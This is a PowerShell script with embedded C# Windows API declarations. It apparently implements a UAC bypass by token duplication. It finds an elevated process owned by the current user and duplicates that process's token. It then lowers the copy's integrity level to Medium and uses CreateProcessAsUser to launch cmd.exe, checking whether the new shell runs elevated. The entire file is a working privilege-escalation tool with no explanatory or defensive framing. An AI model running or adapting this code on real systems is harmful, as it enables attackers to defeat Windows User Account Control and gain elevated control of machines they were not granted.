function TH {
    param (
        [Parameter(Mandatory = $False)]
	    [int]$Id
    )  

    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
	
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
	    public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
	
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
	    public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
	    public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
	    public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
	    public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
	    public IntPtr hStdError;
    }
	
    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
	    public int length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_MANDATORY_LABEL
    {
	    public SID_AND_ATTRIBUTES Label;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SID_AND_ATTRIBUTES
    {
	    public IntPtr Sid;
        public UInt32 Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_ELEVATION
    {
	    public uint TokenIsElevated;
    }

    [Flags]
    public enum ProcessAccess : uint
    {
	    PROCESS_QUERY_INFORMATION 	         = 0x0400,
	    PROCESS_QUERY_LIMITED_INFORMATION    = 0x1000,
        PROCESS_ALL_ACCESS                   = 0xffff
    }

    [Flags]
    public enum TokenAccess : uint
    {
	    TOKEN_ASSIGN_PRIMARY                 = 0x00000001,
        TOKEN_DUPLICATE                      = 0x00000002,
	    TOKEN_IMPERSONATE                    = 0x00000004,
        TOKEN_QUERY                          = 0x00000008,
        TOKEN_QUERY_SOURCE                   = 0x00000010,
        TOKEN_ADJUST_PRIVILEGES              = 0x00000020,
        TOKEN_ADJUST_GROUPS                  = 0x00000040,
        TOKEN_ADJUST_DEFAULT                 = 0x00000080,
        TOKEN_ADJUST_SESSION_ID              = 0x00000100,
        MAXIMUM_ALLOWED                      = 0x02000000
    }

    [Flags]
    public enum TokenInformationClass : uint
    {
        TokenUser                            = 1,
        TokenGroups                          = 2,
        TokenPrivileges                      = 3,
        TokenOwner                           = 4,
        TokenPrimaryGroup                    = 5,
        TokenDefaultDacl                     = 6,
        TokenSource                          = 7,
        TokenType                            = 8,
        TokenImpersonationLevel              = 9,
        TokenStatistics                      = 10,
        TokenRestrictedSids                  = 11,
        TokenSessionId                       = 12,
        TokenGroupsAndPrivileges             = 13,
        TokenSessionReference                = 14,
        TokenSandBoxInert                    = 15,
        TokenAuditPolicy                     = 16,
        TokenOrigin                          = 17,
        TokenElevationType                   = 18,
        TokenLinkedToken                     = 19,
        TokenElevation                       = 20,
        TokenHasRestrictions                 = 21,
        TokenAccessInformation               = 22,
        TokenVirtualizationAllowed           = 23,
        TokenVirtualizationEnabled           = 24,
        TokenIntegrityLevel                  = 25,
        TokenUIAccess                        = 26,
        TokenMandatoryPolicy                 = 27,
        TokenLogonSid                        = 28,
        TokenIsAppContainer                  = 29,
        TokenCapabilities                    = 30,
        TokenAppContainerSid                 = 31,
        TokenAppContainerNumber              = 32,
        TokenUserClaimAttributes             = 33,
        TokenDeviceClaimAttributes           = 34,
        TokenRestrictedUserClaimAttributes   = 35,
        TokenRestrictedDeviceClaimAttributes = 36,
        TokenDeviceGroups                    = 37,
        TokenRestrictedDeviceGroups          = 38,
        TokenSecurityAttributes              = 39,
        TokenIsRestricted                    = 40,
        MaxTokenInfoClass                    = 41
    };

    [Flags]
    public enum Attributes : long
    {
        SE_GROUP_ENABLED                     = 0x00000004L,
        SE_GROUP_ENABLED_BY_DEFAULT          = 0x00000002L,
        SE_GROUP_INTEGRITY                   = 0x00000020L,
        SE_GROUP_INTEGRITY_ENABLED           = 0x00000040L,
        SE_GROUP_LOGON_ID                    = 0xC0000000L,
        SE_GROUP_MANDATORY                   = 0x00000001L,
        SE_GROUP_OWNER                       = 0x00000008L,
        SE_GROUP_RESOURCE                    = 0x20000000L,
        SE_GROUP_USE_FOR_DENY_ONLY           = 0x00000010L
    };

    public static class Kernel32
    {
	    [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr OpenProcess(
		    uint dwDesiredAccess,
            bool bInheritHandle,
            uint dwProcessId
        );

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool CreateProcess(
		    string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes, 
		    ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags, 
		    IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo, 
		    out PROCESS_INFORMATION lpProcessInformation
        );
    }
    
    public static class Advapi32
    {        
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool OpenProcessToken(
		    IntPtr ProcessHandle,
            uint DesiredAccess,
            ref IntPtr TokenHandle
        );

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool GetTokenInformation(
		    IntPtr TokenHandle,
		    int TokenInformationClass,
		    out TOKEN_ELEVATION TokenInformation,
		    int TokenInformationLength,
            out int ReturnLength
        );

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool DuplicateTokenEx(
		    IntPtr hExistingToken,
            uint dwDesiredAccess,
            ref SECURITY_ATTRIBUTES lpTokenAttributes,
            uint ImpersonationLevel,
            uint TokenType,
            ref IntPtr phNewToken
        );

        [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
        public static extern bool CreateProcessAsUser(
            IntPtr hToken,
            String lpApplicationName,
            String lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandle,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            String lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool ConvertStringSidToSid(
		    string StringSid,
            out IntPtr ptrSid
        );

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool ConvertSidToStringSid(
		    IntPtr pSid,
            out string StringSid
        );
    }

    public static class NtDll
    {        
	    [DllImport("ntdll.dll")]
	    public static extern int NtSetInformationToken(
		    IntPtr TokenHandle,
		    int TokenInformationClass,
		    ref TOKEN_MANDATORY_LABEL TokenInformation,
		    int TokenInformationLength
        );
    }
"@
    
    function IsElevated {
        param (
            [Parameter(Mandatory = $False)]
	        [int]$Id
        )
        
        # check pid is elevated
        $hProcess = [Kernel32]::OpenProcess([ProcessAccess]::PROCESS_QUERY_LIMITED_INFORMATION, $false, $Id)
        if($hProcess) {
            $hToken = [IntPtr]::Zero
            if([Advapi32]::OpenProcessToken($hProcess, [TokenAccess]::MAXIMUM_ALLOWED, [ref]$hToken)) {
                $TokenInfo = New-Object TOKEN_ELEVATION
                $TokenInfoLength = 0
                if([Advapi32]::GetTokenInformation($hToken, [TokenInformationClass]::TokenElevation, [ref]$TokenInfo, 4, [ref]$TokenInfoLength)) {
                    if($TokenInfo.TokenIsElevated) {
                        Return $hToken
                    }
                }
            }
        }
        Return $False
    }
   
    # Get list of Process IDs
    $Owners = @{}
    $AllPids = @()
    $UserPids = @()
    gwmi win32_process |% {$Owners[$_.handle] = $_.getowner().user}
    $ps = get-process | select Id,@{l="Owner";e={$Owners[$_.id.tostring()]}}
    foreach($p in $ps) {
        $AllPids += $p.Id
        if($p.Owner -eq $env:USERNAME) {
            $UserPids += $p.Id
        }
    }

    # Check Pid Parameter
    if($Id) {
        if($Id -notin $AllPids) {
            echo "[!] Process Id $Id is not running`n"
            Break    
        }
        if($Id -in $UserPids) {
            echo "[*] Process Id $Id is owned by '$env:USERNAME'"
        } else {
            echo "[!] Process Id $Id is not owned by $env:USERNAME`n"
            Break            
        }

        $hToken = IsElevated -Id $Id
        if($hToken) {
            echo "[*] Process Id $Id is Elevated"
        } else {
            echo "[!] Process Id $Id is not Elevated`n"
            Break            
        }
    } else {
        # Loop through Pids to try find an Elevated process
        foreach($p in $UserPids) {
            $hToken = IsElevated -Id $p
            if($hToken) {
                echo "[*] Process Id $p is Elevated"
                Break
            }
        }
    }

    if($hToken -eq 0) {
        echo "[!] Elevated Process Not Found"
        Break
    }
    
    # StartupInfo Struct
    $STARTUPINFO = New-Object STARTUPINFO
    $STARTUPINFO.dwFlags = 0x1
    $STARTUPINFO.wShowWindow = 0x1
    $STARTUPINFO.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($STARTUPINFO) # Struct Size
	
    # ProcessInfo Struct
    $PROCESS_INFORMATION = New-Object PROCESS_INFORMATION

    # SECURITY_ATTRIBUTES Struct (Process & Thread)
    $SECURITY_ATTRIBUTES = New-Object SECURITY_ATTRIBUTES
    $SECURITY_ATTRIBUTES.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SECURITY_ATTRIBUTES)
	    
    # Call DuplicateTokenEx
    $hNewToken = [IntPtr]::Zero
    if([Advapi32]::DuplicateTokenEx($hToken, [TokenAccess]::MAXIMUM_ALLOWED, [ref]$SECURITY_ATTRIBUTES, 2, 1, [ref]$hNewToken)) {
	    echo "[*] Duplicated Token"
    } else {
	    $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        echo "[!] Failed to Duplicate Token: $(([ComponentModel.Win32Exception] $LastError).Message)`n"
	    Break
    }

    # SID initialize
    $pSID = [IntPtr]::Zero
    $StringSid = "S-1-16-8192"
    if ([Advapi32]::ConvertStringSidToSid($stringSid,[ref]$pSID)) {
        echo "[*] Initialized Medium Integrity Level SID: $StringSid"
    } else {
	    $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        echo "[!] Failed initialize SID!: $(([ComponentModel.Win32Exception] $LastError).Message)`n"
	    Break
    }
	
    # Set Token integrity label
    $SID_AND_ATTRIBUTES = New-Object SID_AND_ATTRIBUTES
    $SID_AND_ATTRIBUTES.Sid = $pSID
    $SID_AND_ATTRIBUTES.Attributes = 0x20 # SE_GROUP_INTEGRITY
    $TOKEN_MANDATORY_LABEL = New-Object TOKEN_MANDATORY_LABEL
    $TOKEN_MANDATORY_LABEL.Label = $SID_AND_ATTRIBUTES
    $TOKEN_MANDATORY_LABEL_SIZE = [System.Runtime.InteropServices.Marshal]::SizeOf($TOKEN_MANDATORY_LABEL)

    if([NtDll]::NtSetInformationToken($hNewToken,[TokenInformationClass]::TokenIntegrityLevel,[ref]$TOKEN_MANDATORY_LABEL,$($TOKEN_MANDATORY_LABEL_SIZE)) -eq 0) {
	    echo "[*] Lowered token to Medium Integrity"
    } else {
	    $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        echo "[!] Failed modify token to Medium Integrity: $(([ComponentModel.Win32Exception] $LastError).Message)`n"
	    Break
    }

    # CreateProcessAsUser
    $PROCESS_INFORMATION = New-Object PROCESS_INFORMATION
    $BinPath = "C:\Windows\System32\cmd.exe"
    $Args = $false
    $CurrentDirectory = $Env:SystemRoot
    if([Advapi32]::CreateProcessAsUser($hNewToken, $BinPath, $Args, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x00000010, [IntPtr]::Zero, $CurrentDirectory, [ref]$STARTUPINFO, [ref]$PROCESS_INFORMATION)) {
	    $NewPid = $PROCESS_INFORMATION.dwProcessId
        # Additional elevation check
        if(IsElevated -Id $NewPid) {
            echo "[*] Process Id $NewPid started Elevated`n"
        } else {
            echo "[!] Process Id $NewPid started NOT Elevated`n"
        }
    } else {
	    $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        echo "[!] Failed to create process: $(([ComponentModel.Win32Exception] $LastError).Message) ($LastError)`n"
	    Break
    }
}
